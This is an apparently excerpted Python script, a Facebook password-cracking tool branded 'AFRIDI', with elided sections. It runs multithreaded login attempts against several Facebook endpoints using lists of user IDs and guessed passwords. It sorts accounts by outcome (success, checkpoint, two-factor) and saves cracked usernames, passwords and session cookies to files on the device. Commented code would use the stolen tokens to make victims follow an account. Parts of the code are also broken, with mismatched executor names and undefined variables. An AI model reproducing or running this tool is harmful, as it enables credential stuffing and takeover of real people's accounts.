...
\x1b[1;92m
\x1b[1;96m
\x1b[1;92m     _    _____ ____  ___ ____ ___ 
\x1b[1;97m    / \  |  ___|  _ \|_ _|  _ \_ _|
\x1b[1;93m   / _ \ | |_  | |_) || || | | | | 
\x1b[1;96m  / ___ \|  _| |  _ < | || |_| | | 
\x1b[1;94m /_/   \_\_|   |_| \_\___|____/___|
\x1b[1;93m                                   
\x1b[1;93m
\x1b[1;92m      v   PAKHTOON BRAND ~
\x1b[1;91m-----------------------------------------------
...
class crack:
        ...
        for pw in __juts__:
            try:
                ...
                if "c_user" in str(cok):
                    ...
                    print(f"\r{HH}[OK-AFRIDI] {user} | {pw} \n{check_frnds(qcki)}    ")
                    open("/sdcard/AFRIDI_OK.txt", "a").write(user + "|" + pw + "\n")
                    open("/sdcard/AFRIDI_cokie.txt", "a").write(user + "|" + pw + " | " + qcki + "\n")
                    ok.append(user + pw)
                    #self.follow(coki)
                    break
                ...
                if "c_user" in str(cok):
                  ...
                  #  self.follow(coki)
                    ...
                    if 'Enter login code to continue' in str(rex.text):
                        Mm = '\033[9;31m'
                        print(f"\r{Mm}[2F-AFRIDI] {user} | {pw}{VV}     ")
                        open("/sdcard/SORRY_2F.txt", "a").write(user + "|" + pw + "\n")
                        f2.append(user + pw)
                        break
                    else:
                        print(f"\r\033[1;94m[CP-SORRY] {user} | {pw}  {samiya(user)} ")
                        open("/sdcard/SORRY_CP.txt", "a").write(user + "|" + pw + "\n")
                        cp.append(user + pw)
                        break
                else:
                    continue
            ...
            try:
                ...
                if 'session_key' in str(q) or 'c_user' in str(q):
                    ...
                    try:
                        ...
                        name=me['name']
                        idd=me['id']
                        print(f"\r{HH}[OK-AFRIDI] {used} | {pw} {VV}    ")
                        open("/sdcard/AFRIDI_OK.txt", "a").write(used + "|" + pw + "\n")
                        open("/sdcard/AFRIDI_cokie.txt", "a").write(used + "|" + pw + " | " + qcki + "\n")
                        ok.append(used + pw)
                       # follow_id='61555233791644'
                      #  subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                        break
                    except KeyError:
                        print(f"\r\033[1;33m[TL-AFRIDI] {used} | {pw} {VV}    ")
                        tl.append(used + pw)
                        break
                    ...
                    if len(used)<11 or len(used)>15:
                        used = user
                    print(f"\r{Mm}[2F-AFRIDI] {used} | {pw}{VV}     ")
                    open("/sdcard/AFRIDI_2F.txt", "a").write(used + "|" + pw + "\n")
                    f2.append(used + pw)
                    break
                    ...
                    if 'uid' not in str(q) or 'skip_ixt_start_dialog' in str(q):
                        ...
                        print(f"\r{BB}[CP-AFRIDI] {used} | {pw} {VV}    ")
                        open("/sdcard/AFRIDI_CP.txt", "a").write(used + "|" + pw + "\n")
                        cp.append(used + pw)
                        break
                else:
                    continue
    ...
    def cek_cp(self,user,pw):
        ...
        if "c_user" in str(cok):
        	#qcki = coki.split(";")[3] +";"+ coki.split(";")[4] +";"+ coki.split(";")[1]+";"+ coki.split(";")[0] +";"+ "dpr=2;locale=en_US;wd=1600x939;%s" %coki.split(";")[3].replace("c_user", "m_page_voice")
            qcki = coki.split(";")[3] +";"+ coki.split(";")[4] +";"+ coki.split(";")[1]+";"+ coki.split(";")[0] +";"+ "dpr=2;locale=en_US;wd=1600x939;%s" %coki.split(";")[3].replace("c_user", "m_page_voice")
            print(f"\r{HH}[OK-AFRIDI] {user} | {pw} {VV}    ")
            open("/sdcard/AFRIDI_OK.txt", "a").write(user + "|" + pw + "\n")
            ok.append(user + pw)
        elif 'Enter login code to continue' in urlPost.text:
            Mm = '\033[9;31m'
            print(f"\r{Mm}[2F-AFRIDI] {user} | {pw}{VV}     ")
            open("/sdcard/AFRIDI_2F.txt", "a").write(user + "|" + pw + "\n")
            f2.append(user + pw)
        else:
            print(f"\r{BB}[CP-AFRIDI] {user} | {pw} {VV}    ")
            open("/sdcard/AFRIDI_CP.txt", "a").write(user + "|" + pw + "\n")
            cp.append(user + pw)
    ...
    def __pler_(self):
        ...
        if vz in ['1', '2', '3']:
            ...
            time.sleep(0.5)
            print (47*'-')
            print ('\x1b[1;92m   ~~~~~~~THE FACEBOOK KING OF AFRIDI~~~~~~~\x1b[1;97m')
            time.sleep(0.5)
            print (47*'-')
            with Afridi-404(max_workers=30) as (__Afridi404__):
                for juttxd in self.id:
                    try:
                        uid, name = afridixd.split('|')
                        xz = name.split(' ')
                        ...
                        if vz == '1' and uz == '1':
                            __afridibarnd__.submit(self.__mbasic__,uid,pwx,"free.facebook.com")
                        elif vz == '1' and uz == '2':
                            __afridibarnd__.submit(self.__mbasic__,uid,pwx,"p.facebook.com")
                        elif vz == '1' and uz == '3':
                            __afridibarnd__.submit(self.__mbasic__,uid,pwx,"x.facebook.com")
                        elif vz == '2' and uz == '1':
                            __afridibarnd__.submit(self.__free__,uid,pwx,url1)
                        elif vz == '2' and uz == '2':
                            __afridibarnd__.submit(self.__free__,uid,pwx,url2)
                        elif vz == '2' and uz == '3':
                            __afridibarnd__.submit(self.__free__,uid,pwx,url1)
                        elif vz == '3' and uz == '1':
                            __afridibarnd__.submit(self.__mmb__,uid,pwx,url1)
                        elif vz == '3' and uz == '2':
                            __afridibarnd__.submit(self.__mmb__,uid,pwx,url2)
                        elif vz == '3' and uz == '3':
                            __afridibrand__.submit(self.__mmb__,uid,pwx,url1)
                        else:
                            __afridibarnd__.submit(self.__mbasic__,uid,pwx,'p.facebook.com')
                    except:
                        pass
    ...
    def __random__(self):
        ...
        if tg == '1':
                ...
                with JuttBadshah(max_workers=30) as (__juttbrand__):
                    for juttxd in self.id:
                        try:
                            ...
                            url3 = 'https://b-api.facebook.com/method/auth.login'
                            if vz == '1' and uz == '1':
                                __afridibarnd__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                            elif vz == '1' and uz == '2':
                                __afridibarnd__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
                            elif vz == '1' and uz == '3':
                                __afridibarnd__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
                            elif vz == '2' and uz == '1':
                                __afridibarnd__.submit(self.__free__,uid,pwx,url1)
                            elif vz == '2' and uz == '2':
                                __afridibarnd__.submit(self.__free__,uid,pwx,url1)
                            elif vz == '2' and uz == '3':
                                __afridibarnd__.submit(self.__free__,uid,pwx,url3)
                            elif vz == '3' and uz == '1':
                                __afridibarnd__.submit(self.__mmb__,uid,pwx,url1)
                            elif vz == '3' and uz == '2':
                                __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
                            elif vz == '3' and uz == '3':
                                __afridibarnd__.submit(self.__mmb__,uid,pwx,url3)
                            else:
                                __afridibarnd__.submit(self.__free__,uid,pwx,url1)
                        except:
                            pass
            ...
            if vz in ['1', '2', '3']:
                ...
                time.sleep(0.5)
                print (47*'-')
                print ('\x1b[1;92m   ~~~~~~~THE KING OF AFRIDI~~~~~~~\x1b[1;97m')
                time.sleep(0.5)
                print (47*'-')
                with AfridiKing(max_workers=30) as (__afridibarnd__):
                    for juttxd in self.id:
                        try:
                            juid = juttxd.split('|')[0]
                            uid = k+c+juid
...
def separate():
    ...
    if file_name == '':
        main_menu()
    print ('\033[1;33mFor Example /sdcard/Afridi.txt\033[0;97m')
    print (47*'-')
